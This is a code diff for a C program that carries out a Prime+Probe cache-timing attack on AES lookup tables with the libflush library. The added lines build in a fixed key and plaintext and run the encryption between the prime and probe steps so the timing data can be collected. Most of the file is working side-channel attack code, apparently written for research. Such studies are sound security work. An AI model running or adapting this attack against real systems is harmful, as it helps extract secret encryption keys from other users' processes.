@@ -2,6 +2,7 @@
 
 #define _GNU_SOURCE
 
+#include "AES.h"
 #include "gaddr.h"
 #include "gset.h"
 #include <getopt.h>
@@ -18,26 +19,35 @@
 #include <unistd.h>
 
 
-#define BIND_TO_CPU 0
-#define BIND_THREAD_TO_CPU 1
-#define AES_TABLE_LENGTN 16    // the block num of aes look up table
-#define AES_TABLE_SUM 64
-#define AES_TABLE_BASE 100
-#define CACHE_SET_NUMS 512
-#define BASE_COUNTS 1000
-#define DELAY_TIME 10
-#define SUM_COUNTS 10000
-#define MODE_ATTACK 1
-#define NODE_BASE 0
+#define BIND_TO_CPU 0 // 默认绑定的cpu
+#define BIND_THREAD_TO_CPU 1 // thread计时绑定的cpu
+#define AES_TABLE_LENGTN 16 // the block num of aes look up table
+#define AES_TABLE_SUM 64 // AES Table所能映射到的set个数
+#define AES_TABLE_BASE 100 // 默认T0起始位置对应的SET索引
+#define CACHE_SET_NUMS 512 // 目标机cache所包含的set数
+#define BASE_COUNTS 5000 // 获取base时间的prime probe个数
+#define DELAY_TIME 10 // prime与probe之间的时间间隔，默认为10us
+#define SUM_COUNTS 10000 // 攻击次数
+#define MODE_ATTACK 1 // 攻击模式 1表示对victim进行攻击
+#define NODE_BASE 0 // 攻击模式 0表示获取set base时间
+#define AES_KEY_LENGTH 16       // the length of key
+#define AES_PLAINTEXT_LENGTH 16 // the length of plaintext
 
 #define _STR(x) #x
 #define STR(x) _STR(x)
+
+void doaes(unsigned char *inaes, aesTableSet *tables); // execute aes algorithm with a given plaintext
+
+unsigned char key[AES_KEY_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
+                                     0x77, 0x00, 0x11, 0x22, 0x33, 0x44,
+                                     0x55, 0x66, 0x77};
 
 
 static void print_help(char* argv[]) {
   fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
   fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
   fprintf(stdout, "\t-m, -mode <value>\t program mode (default: " STR(MODE_ATTACK) ")\n");
+  fprintf(stdout, "\t-n, -nums <value>\t base example nums (default: " STR(BASE_COUNTS) ")\n");
   fprintf(stdout, "\t-d, -delay <value>\t delay between prime and probe (default: " STR(DELAY_TIME) ")\n");
   fprintf(stdout, "\t-s, -sum <value>\t attack sum counts (default: " STR(SUM_COUNTS) ")\n");
   fprintf(stdout, "\t-b, -base <value>\t Table base set (default: " STR(AES_TABLE_BASE) ")\n");
@@ -46,10 +56,13 @@ static void print_help(char* argv[]) {
                                                           
 
 int main(int argc, char* argv[]) {
+  aesTableSet tables; // the struct contains aes t-table's start addr
+
   libflush_session_t *libflush_session;
 
   size_t delay = DELAY_TIME;
   size_t sum = SUM_COUNTS;
+  size_t nums = BASE_COUNTS;
 
   /* Define parameters */
   size_t cpu = BIND_TO_CPU;
@@ -61,10 +74,11 @@ int main(int argc, char* argv[]) {
   size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
   fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);
 
-  static const char* short_options = "t:b:h";
+  static const char* short_options = "c:m:n:d:s:b:h:";
   static struct option long_options[] = {
     {"cpu", required_argument, NULL, 'c'},
     {"mode", required_argument, NULL, 'm'},
+    {"nums", required_argument, NULL, 'n'},
     {"base", required_argument, NULL, 'b'},
     {"delay", required_argument, NULL, 'd'},
     {"sum", required_argument, NULL, 's'},
@@ -110,6 +124,13 @@ int main(int argc, char* argv[]) {
           return -1;
         }
         break;
+      case 'n':
+        nums = atoi(optarg);
+        if (nums <= 0) {
+          fprintf(stderr, "Error: nums %zu in not available.\n", mode);
+          return -1;
+        }
+        break;
       case 'h':
         print_help(argv);
         return 0;
@@ -140,7 +161,12 @@ int main(int argc, char* argv[]) {
   fprintf(stdout, "initialize libflush success!\n");
   fprintf(stdout, "now start asynchronized aes attack\n");
 
+  unsigned char inaes[AES_PLAINTEXT_LENGTH] = {0x61, 0x62, 0x63, 0x64, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65};
+  doaes(inaes, &tables);
+
   if (mode == MODE_ATTACK) {
+    getBaseTime(libflush_session);
+
     uint32_t *tmp;
     tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
     if (tmp == NULL) {
@@ -150,9 +176,10 @@ int main(int argc, char* argv[]) {
     memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));
 
     for (int i = 0; i < sum; i++) {
-      getTmpTime2(libflush_session, tmp, base, delay);
-      usleep(delay);
+      getTmpTime2(libflush_session, tmp, base, delay, inaes, tables);
+      // usleep(delay);
     }
+    aes_ecb_encrypt(NULL, NULL, NULL, &tables);
     free(tmp);
     fprintf(stdout, "aes asynchronized attack completed\n");
   } else {
@@ -162,7 +189,8 @@ int main(int argc, char* argv[]) {
   return 0;
 }
 
-void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay) {
+void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay, unsigned int * inaes, aesTableSet tables) {
+  base = tables.t0_si[0];
   int base0 = base;
   int base1 = base + 16;
   int base2 = base + 32;
@@ -173,7 +201,8 @@ void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, i
     libflush_prime(libflush_session, base2 + j);
     libflush_prime(libflush_session, base3 + j);
   }
-  usleep(delay);
+  doaes(inaes, &tables);
+  // usleep(delay);
   for (int j = 0; j < AES_TABLE_LENGTN; j++) {
     tmp[j + AES_TABLE_LENGTN * 0] = libflush_probe(libflush_session, base0 + j);
     tmp[j + AES_TABLE_LENGTN * 1] = libflush_probe(libflush_session, base1 + j);
@@ -184,11 +213,13 @@ void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, i
 }
 
 //获取aes table占用的set的prime probe访问时间
-void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay) {
+void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay, unsigned int * inaes, aesTableSet tables) {
+  base = tables.t0_si[0];
   for (int j = 0; j < AES_TABLE_SUM; j++) {
     libflush_prime(libflush_session, base + j);
   }
-  usleep(delay);
+  // usleep(delay);
+  doaes(inaes, &tables);
   for (int j = 0; j < AES_TABLE_SUM; j++) {
     tmp[j] = libflush_probe(libflush_session, base + j);
   }
@@ -251,4 +282,9 @@ void writeT2TF(uint32_t *tmp) {
   for (int i = 0; i <AES_TABLE_SUM; i++) {
     tmp[i] = 0;
   }
+}
+
+void doaes(unsigned char *inaes, aesTableSet *tables) {
+  unsigned char outaes[16] = {0};
+  aes_ecb_encrypt(key, inaes, outaes, tables);
 }
